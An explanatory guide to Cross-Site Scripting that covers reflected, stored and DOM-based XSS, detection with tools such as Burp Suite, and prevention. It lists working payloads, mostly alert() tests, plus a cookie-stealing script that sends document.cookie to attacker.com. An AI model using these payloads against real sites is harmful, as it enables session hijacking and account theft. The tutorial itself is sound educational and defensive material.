# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a web vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users.

These scripts are usually executed in the victim's browser and can perform actions such as:

- stealing session cookies
- redirecting users to malicious websites
- modifying page content
- performing actions on behalf of the victim

XSS vulnerabilities occur when user input is not properly validated or sanitized before being displayed in the browser.

---

# Basic Example

Consider a comment field on a website that displays user input without sanitization.

User input:

```html
<script>alert('XSS')</script>
```

If the application reflects this input directly, the browser will execute the script.

---

# Types of XSS

## Reflected XSS

Reflected XSS occurs when user input is immediately returned in the response.

Example: ``` http://example.com/search?q=<script>alert(1)</script> ```

If the application reflects the ```q``` parameter without sanitization, the script executes in the browser.

Reflected XSS usually requires the victim to click a malicious link.

---

## Stored XSS

Stored XSS occurs when malicious input is stored in the application database.

Examples:

- comment sections

- forum posts

- user profiles

When another user views the page, the malicious script executes automatically.

Stored XSS is often more dangerous because it affects multiple users.

---

## DOM-Based XSS

DOM-based XSS occurs when the vulnerability exists in client-side JavaScript rather than server-side code.

Example vulnerable code: ```js document.write(location.hash); ```

If the URL contains malicious input: ``` http://example.com/#<script>alert(1)</script> ```

The script may execute directly in the browser.

# Common Payloads

Simple alert payload: ```html <script>alert(1)</script> ```

Image-based payload: ```html <img src=x onerror=alert(1)> ```

Cookie stealing example: 
```js
<script>
fetch("http://attacker.com?cookie=" + document.cookie)
</script>
```

---

# Impact

XSS vulnerabilities can allow attackers to:

- steal session cookies

- hijack user accounts

- modify website content

- perform actions on behalf of users

If an administrator is affected, the impact can be severe.

---

# Detecting XSS

XSS vulnerabilities can often be discovered by injecting test payloads into input fields and observing the response.

Common tools:

- Burp Suite

- browser developer tools

- manual testing

Example test payload: ```html <script>alert('test')</script> ```

---

# Prevention

Common mitigation techniques include:

- output encoding

- input validation

- Content Security Policy (CSP)

- proper escaping of user input

Example of escaping user input in HTML: ```html &lt;script&gt;alert(1)&lt;/script&gt; ```

This prevents the browser from executing the script.

# Notes

XSS is one of the most common web vulnerabilities and frequently appears in penetration testing and bug bounty programs.

Modern frameworks provide protections against XSS, but insecure handling of user input can still introduce vulnerabilities.